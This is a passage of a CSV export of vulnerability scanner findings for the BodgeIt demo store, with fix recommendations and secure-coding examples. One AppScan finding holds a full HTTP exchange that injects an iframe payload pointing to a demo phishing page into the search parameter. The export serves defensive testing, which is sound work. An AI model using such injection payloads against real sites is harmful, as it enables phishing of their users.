of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</text> <text>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","79","Phishing Through Frames","","Medium","Open","2015-10-15","IBM Security AppScan Standard","301","Reflection Attack in an Authentication Protocol","","/bodgeit/search.jsp","q","","http://localhost/bodgeit/search.jsp","Parameter: q=1234 -> q=1234%27%22%3E%3Ciframe+id%3D109+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E","GET /bodgeit/search.jsp?q=1234%27%22%3E%3Ciframe+id%3D109+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/search.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2079 Date: Thu, 15 Oct 2015 22:22:15 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <b>You searched for:</b> 1234'""><iframe id=109 src=http://demo.testfire.net/phishing.html><br/><br/> <div><b>No Results Found</b></div> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The test result seems to indicate a vulnerability because the test response contained a frame/iframe to URL ""http://demo.testfire.net/phishing.html"".","<fixRecommendations> <fixRecommendation type=""General""> <text>There are several mitigation techniques:</text> <text>[1] Strategy: Libraries or Frameworks</text> <text>Use a vetted library or framework that does not allow this weakness to occur, or provides constructs that make it easier to avoid.</text> <text>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</text> <br></br> <text>[2] Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</text> <text>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</text> <text>Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:</text> <text>[-] HTML body</text> <text>[-] Element attributes (such as src=""XYZ"")</text> <text>[-] URIs</text> <text>[-] JavaScript sections</text> <text>[-] Cascading Style Sheets and style property</text> <text>Note that HTML Entity Encoding is only appropriate for the HTML body.</text> <text>Consult the XSS Prevention Cheat Sheet </text> <link target=""http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</link> <text>for more details on the types of encoding and escaping that are needed.</text> <br></br> <text>[3] Strategy: Identify and Reduce Attack Surface</text> <text>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</text> <br></br> <text>[4] Strategy: Output Encoding</text> <text>For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.</text> <br></br> <text>[5] Strategy: Identify and Reduce Attack Surface</text> <text>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</text> <br></br> <text>[6] Strategy: Input Validation</text> <text>Assume all input is malicious. Use an ""accept known good"" input validation strategy: a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on a blacklist of malicious or malformed inputs. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</text> <text>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as ""red"" or ""blue.""</text> <text>When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</text> <text>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (""<3"") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the ""<"" character, which would need to be escaped or otherwise handled. In this case, stripping the ""<"" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</text> <text>Even if you make a mistake in your validation (such as forgetting one of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</text> <text>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","275","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","338","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","388","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","474","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/logout.jsp","","","http://localhost/bodgeit/root/logout.jsp","","","","","","","",""
"DemoApps","","Bodgeit","546","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/logout.jsp","","","http://localhost/bodgeit/root/logout.jsp","","","","","","","",""
"DemoApps","","Bodgeit","555","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/logout.jsp","","","http://localhost/bodgeit/root/logout.jsp","","","","","","","",""
"DemoApps","","Bodgeit","399","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","596","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","333","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/root/register.jsp","username","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","294","Session_Fixation","","Medium","Open","2015-10-15","Checkmarx","384","Session Fixation","A2","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","392","Trust_Boundary_Violation","","Medium","Open","2015-10-15","Checkmarx","501","Trust Boundary Violation","","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","607","Trust_Boundary_Violation","","Medium","Open","2015-10-15","Checkmarx","501","Trust Boundary Violation","","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","653","Use_of_Cryptographically_Weak_PRNG","","Medium","Open","2015-10-15","Checkmarx","338","Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","454","Use_of_Cryptographically_Weak_PRNG","","Medium","Open","2015-10-15","Checkmarx","338","Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","363","Use_of_Cryptographically_Weak_PRNG","","Medium","Open","2015-10-15","Checkmarx","338","Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","366","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","382","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","441","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","503","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","537","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","645","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","531","Use_of_Hard_coded_Cryptographic_Key","","Medium","Open","2015-10-15","Checkmarx","321","Use of Hard-coded Cryptographic Key","","/bodgeit/src/com/thebodgeitstore/util/AES.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/util/AES.java","","","","","","","",""
"DemoApps","","Bodgeit","542","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","636","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","309","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","648","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","558","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/dbconnection.jspf","","","http://localhost/bodgeit/root/dbconnection.jspf","","","","","","","",""
"DemoApps","","Bodgeit","278","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","630","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","407","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","379","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","589","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","518","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","319","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","269","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","516","Hardcoded_password_in_Connection_String","","Medium","Open","2015-10-15","Checkmarx","547","Use of Hard-coded, Security-relevant Constants","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","466","Use_of_Insufficiently_Random_Values","","Medium","Open","2015-10-15","Checkmarx","330","Use of Insufficiently Random Values","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","573","Client_Use_Of_JQuery_Outdated_Version","","Medium","Open","2015-10-15","Checkmarx","477","Use of Obsolete Functions","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","245","Access Control: Database","","Low","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/basket.jsp","quantity","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = 